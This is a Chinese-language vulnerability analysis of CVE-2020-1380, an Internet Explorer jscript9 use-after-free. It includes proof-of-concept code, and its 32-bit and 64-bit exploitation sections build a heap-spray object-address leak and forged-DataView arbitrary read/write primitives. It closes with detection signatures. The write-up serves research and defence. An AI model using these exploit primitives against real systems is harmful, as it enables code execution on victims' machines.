@@ -1,0 +1,686 @@
+## **一、概述  
+**
+
+CVE-2020-1380是[卡巴斯基](https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/)去年捕获的0day，是位于Internet Explorer
+11的JavaScript引擎jscript9.dll中的UAF（Use-After-Free）漏洞。
+
+在POC公开后，[iamelli0t](https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html)与[银雁冰](https://bbs.pediy.com/thread-263885.htm)陆续对漏洞成因与利用思路进行了分享。
+
+本文旨在补充漏洞成因与利用思路中被前三者（卡巴斯基、iamelli0t与银雁冰）省略的部分细节，分享基于32位的漏洞利用实现64位漏洞利用的过程，并提出针对该漏洞的动静态检测方法。
+
+希望能对学习有关内容的同学有所帮助。如果发现分析过程中疏漏的地方还请批评指正，谢谢。
+
+本文基于卡巴斯基公开的POC，其代码如下：
+
+    
+    
+    function func(O, A, F, O2) {
+        arguments.push = Array.prototype.push;
+        O = 1;
+        arguments.length = 0;
+        arguments.push(O2);
+        if (F == 1) {
+            O = 2;
+        }
+    
+        // execute abp.valueOf() and write by dangling pointer
+        A[5] = O;
+    };
+    
+    // prepare objects
+    var an = new ArrayBuffer(0x8c);
+    var fa = new Float32Array(an);
+    
+    // compile func
+    func(1, fa, 1, {});
+    for (var i = 0; i < 0x10000; i++) {
+        func(1, fa, 1, 1);
+    }
+    
+    var abp = {};
+    abp.valueOf = function() {
+    
+        // free 
+        worker = new Worker('worker.js');
+        worker.postMessage(an, [an]);
+        worker.terminate();
+        worker = null;
+    
+        // sleep
+        var start = Date.now();
+        while (Date.now() - start < 200) {}
+    
+        // TODO: reclaim freed memory
+    
+        return 0
+    };
+    
+    try {
+        func(1, fa, 0, abp);
+    } catch (e) {
+        reload()
+    }
+
+## 二、 漏洞成因
+
+Jscript9在JIT（Just-In-Time）编译使用 Array.prototype.push()
+给函数参数赋值的代码时，编译器没有考虑到可以通过这种方式修改参数类型。
+
+POC中的func函数内，编译器认为访问参数O时不会触发隐式调用，导致JIT代码中使用O执行赋值操作时没有设置 DisableImplicitFlags
+标志位。当其类型为Object且重写了 valueOf() 方法时，在JIT代码中就可以通过赋值操作触发回调。
+
+POC中的回调函数内，通过将 an 发送到 Worker 后销毁 Worker 对象实现释放 an（an 是 fa
+对象的Buffer），回调返回后向fa[5] 赋值时（A[5] = O），由于该内存已被释放，就会触发访问异常：
+
+    
+    
+    (40c.1884): Access violation - code c0000005 (first chance)
+    First chance exceptions are reported before any exception handling.
+    This exception may be expected and handled.
+    eax=1adb1f70 ebx=147871b0 ecx=00000000 edx=13a16db8 esi=19a4b170 edi=20c3bca0
+    eip=715d8d33 esp=0bdecce4 ebp=0bdecce4 iopl=0         nv up ei pl zr ac pe cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010257
+    jscript9!Js::JavascriptConversion::ToFloat_Helper+0x13:
+    715d8d33 d918            fstp    dword ptr [eax]      ds:002b:1adb1f70=????????
+
+漏洞修复前后的JIT代码对比：
+
+    
+    
+    修复前，没有设置DisableImplicitFlags：
+    
+        ...
+        lea     eax, [eax]
+        push    1DDA88B8h
+        push    eax
+        push    ecx                         <-----  no DisableImplicitFlags
+        call    jscript9!Js::JavascriptConversion::ToFloat_Helper (715d8d20)
+        jmp     1e3d02b6
+        ...
+    
+    修复后，设置了DisableImplicitFlags：
+    
+        ...
+        lea     eax, [eax]
+        push    2A98C8B8h
+        push    eax
+        push    ecx
+        mov     byte ptr ds:[13213F68h], 1
+        mov     byte ptr ds:[13213E86h], 3  <----- set DisableImplicitFlags
+        call    jscript9!Js::JavascriptConversion::ToFloat_Helper (70c5ac50)
+        mov     byte ptr ds:[13213E86h], 0
+        cmp     byte ptr ds:[13213F68h], 1
+        je      0fd302b7
+        ...
+
+卡巴斯基认为该漏洞的成因中还包括“in just-in-time compiled code, the life cycle of ArrayBuffer
+is not checked”，但实际上这与漏洞成因无关。
+
+iamelli0t认为漏洞的本质是：“the type inference error of arguments[0] in the backend JIT
+GlobOpt phase is the root cause. The JIT engine doesn't know the side effect
+of Array.prototype.push, which can be used to change the type of arguments[0].
+The type of arguments[0] should be killed after Array.prototype.push operation
+to avoid this type inference error issue.”
+
+由于Jscript9闭源且为ChakraCore的分支，在观察了ChakraCore中POC被JIT编译的过程后发现，“A[5] =
+O”对应的JIT代码逻辑：检测O的类型是否为数字，是则赋值，否则bailout。而Jscript9中对应的JIT代码逻辑：检测O的类型是否为数字，是则赋值，否则进行类型转换后再赋值。
+
+如果不在JIT代码中进行类型转换，也就不必考虑iamelli0t提到的“the side effect of Array.prototype.push,
+which can be used to change the type of arguments[0].”这一点。
+
+该漏洞修复后只是修复了当前漏洞场景下的类型推断错误，或许还会有通过其他方式导致相似Bug。
+
+##  **三、** ** **32位下的漏洞利用****
+
+银雁冰的32位漏洞利用思路已经写的比较清楚，但是为了方便理解与描述差异，还是首先介绍32位下的漏洞利用过程：
+
+### 3.1 UAF -1
+
+首先利用漏洞实现第一次UAF，而这次UAF的目的是为了实现第二次UAF。
+
+第一次UAF的过程对应POC中代码：
+
+在系统堆上创建大小为0x8c的ArrayBuffer，并用它创建一个Array。
+
+反复调用函数触发JIT后，在JIT后的函数中通过Array[5] =
+Object触发Object.valueOf()回调，在回调函数内释放ArrayBuffer。
+
+通过创建成员数量为(0x1000 - 0x20) / 4
+的Array对象，在系统堆上创建大小为0x8c的LargeHeapBlock对象，利用该对象重用ArrayBuffer的内存。
+
+    
+    
+    // TODO: reclaim freed memory
+     for (var i = 0; i < T.length; i += 1) {
+         T[i] = new Array((0x1000 - 0x20) / 4);
+         T[i][0] = 0x666; // item needs to be set to allocate LargeHeapBucket
+     }
+
+Jscript9管理的Array对象Buffer大小为：数组大小*4+0x20，因此第三点中还创建了大小为0x1000的Buffer。
+
+回调函数返回，此时Array[5]指向LargeHeapBlock+0x14处，回调函数返回值 (0)
+被写入该位置。而LargeHeapBlock+0x14处保存了该对象管理的已分配内存块数量，当该值为0时，触发垃圾回收可以释放该LargeHeapBlock对象管理的内存块。
+
+###  ** **3.2 UAF-2****
+
+通过调用CollectGarbage()触发第二次UAF，这次UAF的目的是为了实现信息泄露：
+
+1、调用CollectGarbage()手动触发gc。gc过程中会遍历对象，当访问到被第一次UAF修改了的LargeHeapBlock时，会清理该对象管理的内存；此时该对象管理的Array对象的Buffer就变为了垂悬指针。
+
+2、再次创建和第一次UAF时一样大的Array对象，这会导致重用被gc释放的Buffer，即重用’1.
+’中所述的垂悬指针，获得了一个被两个Array对象共用的Buffer。
+
+    
+    
+    CollectGarbage();
+    
+     for (var i = 0; i < K.length; i += 1) {
+         K[i] = new Array((0x1000 - 0x20) / 4);
+         K[i][0] = 0x888; // store magic
+     }
+    
+     for (var i = 0; i < T.length; i += 1) {
+         if (T[i][0] == 0x888) {
+             // find array accessible through dangling pointer
+             obj_arr = T[i];
+             obj_arr[0] = 0x999;
+             break;
+         }
+     }
+     for (var i = 0; i < K.length; i += 1) {
+         if (K[i][0] == 0x999) {
+             int_arr = K[i];
+             break;
+         }
+     }
+
+3、此时obj_arr和int_arr的Buffer相同，且类型都为JavascriptNativeIntArray（Int数组）；向obj_arr中传入对象
+(obj_arr[0] =
+{})，会使Jscript9自动进行类型转换；此时obj_arr和int_arr的Buffer依旧一致，并且obj_arr的类型被修改为了JavascriptArray（对象数组）。
+
+4、通过将对象放入obj_arr，再通过int_arr将其值取出，就可以泄露对象地址，将该操作封装成函数方便后续利用过程使用。
+
+    
+    
+    obj_arr[0] = {};
+    
+    function leak_obj(obj) {
+    obj_arr[2] = obj;
+    return int_arr[2];
+    }
+
+###  ** **3.3 Arbitrary R/W****
+
+获得了信息泄露原语后，可以通过伪造一个DataView对象来实现任意地址读写，这部分的利用思路就比较具有普适性了，并且资料也较多。下面简单描述一下思路：
+
+1、创建一个长度为0x10的JavascriptNativeIntArray（Int数组），从而使其Buffer紧跟在Int数组后方，利用第二次UAF获得的信息泄露函数得到它的地址。
+
+    
+    
+    var ga = new Array(6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6);
+    var ga_addr = 0;
+    ga_addr = leak_obj(ga);
+
+2、从ga地址+0x38处取出其Buffer地址，利用信息泄露原语将Buffer地址作为对象读出，使dv指向伪造的DataView对象。
+
+    
+    
+    R[2] = ga;
+    I[2] = I[2] + 0x38;
+    var dv = R[2];
+
+3、向Int数组中写入DataView结构，涉及的结构如下：
+
+    
+    
+    DataView:
+    +0x0  : vtable;
+    +0x4  : TypeObject;
+    +0x8  : 0;
+    +0xc  : 0;
+    +0x10 : JavascriptArrayBuffer;
+    +0x14 : 0;
+    +0x18 : size;
+    +0x1c : Buffer;
+    
+    TypeObject:
+    +0x0  : typeId;
+    +0x4  : JavascriptLibrary;
+    +0x8  : prototype;
+    +0xc  : Js::RecyclableObject::DefaultEntryPoint;
+    +0x10 : 0;
+    +0x14 : 0;
+    +0x18 : SimplePathTypeHandler;
+    +0x1c : value;
+
+DataView进行读取时，只需要保证：
+
+TypeObject对象的typeId正确，JavascriptLibrary地址合法。
+
+size字段值不过小，value值可读写。
+
+因此伪造的DataView如下：
+
+    
+    
+    var dv_addr = ga_addr + 0x38;
+    ga[0] = 0x2e;
+    ga[1] = dv_addr;
+    ga[2] = dv_addr - 0x210;
+    ga[3] = 0;
+    ga[4] = ga_addr + 0x24;
+    ga[5] = 0;
+    ga[6] = -1;
+    ga[7] = dv_addr;
+
+4、通过DataView.prototype去访问DataView对象的方法时不需要访问其虚函数表，这时就可以将需要读写的地址作为伪造的DataView对象的Buffer来封装任意地址读写。
+
+    
+    
+    function setDataAddress(addr) {
+    if (addr >= 0x80000000) {
+    addr = -(0x100000000 - addr);
+    }
+    ga[0x1c / 4] = addr;
+    }
+    
+    function read32(addr) {
+    setDataAddress(addr);
+    return DataView.prototype.getUint32.call(dv, 0, true);
+    }
+    
+    function write32(addr, v) {
+    setDataAddress(addr);
+    DataView.prototype.setUint32.call(dv, 0, v, true);
+    }
+
+5、创建一个DataView对象，从其中读取出正确的TypeObject，覆盖原先伪造的TypeObject，防止后续读写过程中崩溃。
+
+    
+    
+    var rdv = new DataView(new ArrayBuffer(8));
+    var rtype = read32(leak_obj(rdv) + 4);
+    
+    // Fix fake DataView->type
+    ga[0x04 / 4] = rtype;
+
+至此实现了任意地址读写原语，接下只需利用任意地址读写劫持控制流，需要POC的同学可以移步古河老师的Github，或者自己根据公开思路实现，这里就不赘述。
+
+![](https://image.3001.net/images/20210803/1627956770_6108a62281c47103c59d6.gif!small)
+
+pop calc
+
+##  **四、** ** **64位下的漏洞利用****
+
+第二节中详细描述了32位下的利用思路并最终弹出了计算器，而在64位下由于指针宽度改变，UAF过程使用的对象大小需要重新选择。
+
+###  ** **4.1 UAF-1****
+
+1、修改Array对象的成员数量：
+
+    
+    
+    32位下Array对象的Buffer，+10h开始0x10字节为Array data header，+20h开始为用户数据
+    0:008> dd 0ccd8000
+    0ccd8000  00000000 00000ff0 00000000 00000000
+    0ccd8010  00000000 00000001 000003f8 00000000
+    0ccd8020  00000666 80000002 80000002 80000002
+    0ccd8030  80000002 80000002 80000002 80000002
+    
+    64位下Array对象的Buffer，+20h开始0x18字节为Array data header，+38h开始为用户数据
+    0:032> dq 00000126`86c7e000
+    00000126`86c7e000  00000000`00000003 00000000`00001fe0
+    00000126`86c7e010  00000000`00000000 00000000`00000000
+    00000126`86c7e020  000007f0`00000000 00000000`000007f2
+    00000126`86c7e030  00000000`00000000 00000666`00000666
+    00000126`86c7e040  00000666`00000666 00000666`00000666
+
+因此在控制Array对象Buffer大小时，减去的header大小需要改为0x38。
+
+2、重新选择用来UAF的LargeHeapBlock对象大小：
+
+    
+    
+    32位下的LargeHeapBlock对象：
+    0:002> dd 0b*58c240
+    0b*58c240  713e2d60 0bd0c000 099ce168 00000003
+    0b*58c250  00000004 00000004 0000000d 0bd10000
+    0b*58c260  0bd10000 0b*58c2d8 00000000 05c0089c
+    0b*58c270  00000000 00000000 00000000 0b*58c240
+    0b*58c280  00000000 00000000 00000000 00000000
+    0b*58c290  0bd0c000 0bd0d000 0bd0e000 0bd0f000
+    0b*58c2a0  00000000 00000000 00000000 00000000
+    0b*58c2b0  00000000 00000000 00000000 00000000
+    
+    64位下的LargeHeapBlock对象：
+    0:027> dq 0x000001819068bb30
+    00000181`9068bb30  00007fff`50ad2780 00000181`917f0000
+    00000181`9068bb40  00000181`906b0400 00000000`00000003
+    00000181`9068bb*50  00000000`00000010 00000001`00000000
+    00000181`9068bb60  00000181`91800000 00000181`91800000
+    00000181`9068bb70  00000181`9068bc90 00000000`00000000
+    00000181`9068bb80  00000000`00000000 00000000`00000000
+    00000181`9068bb90  00000000`00000000 00000000`00000000
+
+开启页堆时，可以定位到创建LargeHeapBlock对象的函数： LargeHeapBucket::AddLargeHeapBlock：
+
+    
+    
+    struct LargeHeapBlock *__fastcall LargeHeapBucket::AddLargeHeapBlock(LargeHeapBucket *this,unsigned __int64 a2)
+    {
+    ...
+    v6 = PageAllocator::Alloc((PageAllocator *)(v5 + 0x10), &v14, &v15);
+    v7 = v6;
+    if ( v6 )
+    {
+    v8 = v14;
+    v9 = this;
+    if ( !*((_BYTE *)this + 56) )
+    v9 = 0i64;
+    v10 = LargeHeapBlock::New(v6, v14, v15, (unsigned int)(((v14 << 12) - a2 - 32) >> 10) + 1, v9);
+    v11 = v10;
+    ...
+    }
+
+其中PageAllocator::Alloc负责分配Block，LargeHeapBlock::New负责创建新的LargeHeapBlock对象，在这两个函数下断点即可得到每次分配的大小和地址：
+
+    
+    
+    bp jscript9!PageAllocator::Alloc+0x30 ".printf \"Allocated 0x%x bytes Block on LargeHeapBlock, address: 0x%p \\n\", @rsi, @rax;gc;"
+    bp jscript9!LargeHeapBlock::New+0x47 ".printf \"Allocated 0x%x bytes LargeHeapBlock,\", @rdx;gc;"
+    bp jscript9!LargeHeapBlock::New+0x4c ".printf \"on heap: 0x%p\\n\", @rax;gc;"
+
+通过创建不同大小的Array，发现64位下的LargeHeapBlock对象大小可能为：
+
+    
+    
+    0xa0/0xa8/0xb0/0xb8/0xd0/0xe8/0x100/0x118/0x130/0x148/0x160/0x178/0x190
+
+为了创建连续的Buffer，需要使Buffer大小对齐到0x1000。其中：
+
+Buffer大小为0x1000时，LargeHeapBlock对象大小为0x100；
+
+Buffer大小为0x2000时，LargeHeapBlock对象大小为0x160；
+
+其他满足条件大小的Buffer对应的LargeHeapBlock对象大小都为0xa0。
+
+进行堆喷之前，在windbg中使用“!heap -flt s
+[size]”搜索对应大小的堆块可以发现，只有大小为0x160的堆块数量较少。这说明大小为该值时，释放后被其他堆块占用的可能性更小。
+
+因此选择UAF对象的大小为0x160，对应的Array大小为 (0x2000 - 0x38) / 4。
+
+3、在系统堆上创建大小为0x160的ArrayBuffer，并用它创建一个Array。
+
+    
+    
+    var an = new ArrayBuffer(0x160);
+    var fa = new Float32Array(an);
+
+4、反复调用函数触发JIT后，在JIT后的函数中通过Array[0xA] =
+Object触发Object.valueOf()回调，在回调函数内释放ArrayBuffer。
+
+    
+    
+    function func(O, A, F, O2) {
+    arguments.push = Array.prototype.push;
+    O = 1;
+    arguments.length = 0;
+    arguments.push(O2);
+    if (F == 1) {
+    O = 2;
+    }
+    A[0xa] = O;
+    }
+    
+    // compile func
+    func(1, fa, 1, {});
+    for (var i = 0; i < 0x10000; i++) {
+    func(1, fa, 1, 1);
+    }
+    
+    try {
+    func(1, fa, 0, abp);
+    } catch (e) {
+    location.reload();
+    }
+
+5、valueOf()回调函数内，通过创建成员数量为(0x2000 - 0x38) / 4
+的Array对象，在系统堆上创建大小为0x160的LargeHeapBlock对象，利用该对象重用ArrayBuffer的内存。
+
+    
+    
+    var abp = {};
+    abp.valueOf = function () {
+    // free
+    worker = new Worker("worker.js");
+    worker.postMessage(an, [an]);
+    worker.terminate();
+    worker = null;
+    
+    // sleep
+    var start = Date.now();
+    while (Date.now() - start < 200) {}
+    
+    // TODO: reclaim freed memory
+    for (var i = 0; i < spray_arr_int.length; i += 1) {
+    spray_arr_int[i] = new Array((0x2000 - 0x38) / 4);
+    for (var j = 0; j < spray_arr_int[i].length; j += 1) {
+    spray_arr_int[i][j] = 0x666;
+    }
+    }
+    return 0;
+    };
+
+6、回调函数返回，此时Array[0xA]指向LargeHeapBlock+0x28处，回调函数返回值 (0)
+被写入该位置。而64位下LargeHeapBlock+0x28处保存了该对象管理的已分配内存块数量，当该值为0时，触发垃圾回收可以释放该LargeHeapBlock对象管理的内存块。
+
+###  ** **4.2 UAF-2****
+
+接下来继续第二次UAF：
+
+1、调用CollectGarbage()手动触发gc。gc过程中会遍历对象，当访问到被第一次UAF修改了的LargeHeapBlock时，会清理该对象管理的内存；此时该对象管理的Array对象的Buffer就变为了垂悬指针。
+
+2、重新思考第二次UAF的目的与Array对象的Buffer大小计算方式：
+
+第二次UAF的目的是为了得到指向同一块Buffer的JavascriptNativeIntArray和JavascriptArray。
+这时如果还像32位时先重用Buffer再做类型转换，由于JavascriptArray成员大小为QWORD，就会导致JavascriptArray的Buffer大小不够，重新分配新的Buffer，无法实现目的。
+
+因此64位下需要控制重新分配后的Buffer大小，使类型转换后的JavascriptArray对象的Buffer重用到之前被释放的JavascriptNativeIntArray对象的Buffer：
+
+    
+    
+    for (var i = 0; i < spray_arr_object.length; i += 1) {
+    // spray_arr_int[i] = new Array((0x2000 - 0x38) / 4);
+    // [+]申请的Buffer大小为 0x7F2*4 + 0x38 = 0x2000h
+    // [+]Array结构成员数量是7F2
+    
+    spray_arr_object[i] = new Array((0x2000 - 0x38) / 8);
+    // [+]控制Array结构成员数量为0x3F9
+    
+    spray_arr_object[i][0] = 0x888; // store magic
+    
+    spray_arr_object[i][1] = {};
+    // [+]将NativeIntArray转换成了JavascriptArray
+    // [+]JavascriptArray结构成员数量为0x3F9
+    // [+]重新申请的Buffer大小为 0x3F9*8+0x38 = 0x2000
+    }
+
+此外，由于两个数组成员大小不一致，整数数组访问对象数组时，前者需要的index值是后者的一倍（伪代码：arr_int[2n+1]<<32+arr_int[2n]
+= arr_obj[n]）。为了防止后续访问时index超过数组成员数量在Javascript中触发异常，在进行堆喷时就先初始化对象数组所有成员。
+
+    
+    
+    for (var j = 2; j < spray_arr_object[i].length; j += 1) {
+    //防止数组访问越界在Javascript内触发异常
+    spray_arr_object[i][j] = 0x888;
+    }
+
+3、此时obj_arr和int_arr的Buffer相同，通过将对象放入obj_arr[2]，再通过[int_arr[4],
+int_arr[5]]将其值取出，就可以得到对象地址，将该操作封装成函数方便后续利用过程使用。
+
+    
+    
+    function LeakObject(obj) {
+    vuln_obj_array[2] = obj;
+    return [vuln_int_array[4], vuln_int_array[5]];
+    }
+
+###  ** **4.3 Arbitrary R/W****
+
+获得了64位下的信息泄露后，任意地址读写以及代码执行的实现思路和32位下基本一致，这里就不再赘述。
+
+只是需要注意实现read64时需要使用 ** **DataView.prototype.getInt32.call**** 方法而不是 **
+**DataView.prototype.getUint32.call****
+方法，否则在读取大于0x7fffffff的值时会出现地址正确但无法读出正确值的情况。
+
+    
+    
+    function read64(addr, offset) {
+    setDataAddress(addr);
+    return [
+    DataView.prototype.getInt32.call(dv, offset + 0, true),
+    DataView.prototype.getInt32.call(dv, offset + 4, true),
+    ];
+    }
+
+##  **五、** ** **动静态检测思路****
+
+###  ** **5.1 动态检测****
+
+最初想要使用动态检测一般漏洞的思路，即在漏洞成因位置做检测。但是经过请教熟悉JIT引擎的师傅和补丁分析发现：二进制文件改动大，影响的函数多。实现上述思路需要监控的函数调用会很多（也没找到该监控哪些函数调用），难度也比较高。
+
+在放弃了从漏洞成因做检测后，经过调试发现，JIT代码块相较一般函数具有一定特征：
+
+    
+    
+    [+]VariableName:func
+    |-PropertyAddr:0xbcea654
+    |-type: Js::ScriptFunction
+    |-EP addr:07be0000
+    |-number of calls: 5461
+    
+    0:002> u 0x7be0000
+    07be0000 55              push    ebp
+    07be0001 8bec            mov     ebp,esp
+    07be0003 81fc5cc9fa04    cmp     esp,4FAC95Ch
+    07be0009 0f8f0f000000    jg      07be001e
+    07be000f 68f895c905      push    5C995F8h
+    
+    0:002> u Js::InterpreterStackFrame::Process
+    jscript9!Js::InterpreterStackFrame::Process:
+    7147fd20 8bff            mov     edi,edi
+    7147fd22 55              push    ebp
+    7147fd23 8bec            mov     ebp,esp
+    7147fd25 81ec14020000    sub     esp,214h
+
+对比两者可以发现：
+
+JIT代码块的基地址会对齐到0x10000。
+
+JIT代码块头部没有padding。
+
+    
+    
+    8bff            mov     edi,edi
+
+通过上面两点特征，可以认为：当一个函数的返回值对齐到0x10000后，头三个字节为“0x55 0x8b 0xec”时，该函数的调用者是JIT代码。
+
+基于上述方法，可以在Js::JavascriptConversion::ToFloat_Helper函数内针对漏洞影响做检测：
+
+返回地址是否位于JIT代码中；
+
+参数对应的对象类型是否为Object，该对象有没有重写valueOf方法；
+
+返回地址之前有没有设置DisableImplicitFlags。
+
+###  ** **5.2 静态检测****
+
+可以触发该漏洞必须包含的代码逻辑为：
+
+1、重写valueOf方法；
+
+    
+    
+    .valueOf = function()
+
+2、将arguments.push修改为Array.prototype.push；
+
+    
+    
+    arguments.push = Array.prototype.push
+
+3、利用Worker对象的postMessage方法释放对象；
+
+    
+    
+    .postMessage
+
+4、调用terminate方法销毁Worker对象。
+
+    
+    
+    .terminate()
+
+通过Yara规则检测是否存在上述四个特征字符串即可检出该漏洞POC，但是可能存在误报。如果需要精准识别该漏洞，可以添加漏洞利用的静态特征。
+
+##  **六、** ** **新的攻击手法****
+
+前不久的7月14日，Google Threat Analysis Group (TAG)公开了他们捕获的四个ITW（in-the-wild） 0day的[
+_详细信息_](https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/) _5_ ，其中的CVE-2021-33742是位于IE的MSHTML模块中的漏洞。Google对其描述为：“This happened
+by either embedding a remote ActiveX object using a Shell.Explorer.1 OLE
+object or by spawning an Internet Explorer process via VBA macros to navigate
+to a web
+page.”。虽然提到了VBA宏，但文章中给出的两个有关样本的攻击手法都为利用Shell.Explorer.1对象在Office中加载Internet
+Explorer漏洞。
+
+在编辑模式下打开包含Shell.Explorer.1对象的Office文档时，会弹出“安全警告”。
+
+![](https://image.3001.net/images/20210803/1627957281_6108a821e547f5eeb8f1f.png!small)但在编辑模式下，Office进程是不受沙箱保护的，如果受害者点击了“启用内容”按钮，漏洞利用创建的进程将是“Medium”权限，这与先前利用URL
+Moniker去加载IE漏洞的方式本质上是相似的：
+
+![](https://image.3001.net/images/20210803/1627957304_6108a838461eb33a6c4f9.png!small)两者的主要区别在于是否免杀，并且Internet
+Explorer 11即将终止支持并不影响使用了其中组件的其他程序，微软在[
+_CVE-2021-33742漏洞通告_](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33742) _6_ 中对这一点的描述为：“While Microsoft has
+announced retirement of the Internet Explorer 11 application on certain
+platforms and the Microsoft Edge Legacy application is deprecated, the
+underlying MSHTML, EdgeHTML, and scripting platforms are still supported. The
+MSHTML platform is used by Internet Explorer mode in Microsoft Edge as well as
+other applications through WebBrowser control. The EdgeHTML platform is used
+by WebView and some UWP applications. The scripting platforms are used by
+MSHTML and EdgeHTML but can also be used by other legacy applications”。
+
+这意味着如果攻击者发现其他加载方式，即使IE已经被弃用，还是能够利用其组件中的漏洞进行攻击，危害依旧严重。
+
+##  **七、** ** **总结****
+
+明年的6月15日，Internet Explorer 11就将[ _终止支持_](https://docs.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge) _4_
+，在这一年的空档期内，或许就会出现Jscript9模块内的其他0day，搞纯研究的师傅们一般都不关心这种没赏金的模块，而大多数样本分析人员又无法分析0day，因此只有夹在中间，不会挖洞但能分析些0day的菜狗顶上。
+
+##  ** **附录 - 参考**** ** **资料****
+
+[1]:https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/
+
+[2]:https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html
+
+[3]:https://bbs.pediy.com/thread-263885.htm
+
+[4]:https://docs.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge
+
+[5]:https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/
+
+[6]:https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33742
+
+[7]:https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf
+
+[8]: https://www.anquanke.com/post/id/98774
+
+[9]: https://blog.theori.io/research/jscript9_typed_array/
+
+[10]:https://www.rapid7.com/blog/post/2014/04/07/hack-away-at-the-unessential-with-explib2-in-metasploit/
+
+[11]: https://paper.seebug.org/189/
+
+[12]: https://labs.bluefrostsecurity.de/files/Look_Mom_I_Dont_Use_Shellcode-WP.pdf
+
+[13]: https://github.com/guhe120/browser/blob/master/GC/jit_calc.html
+
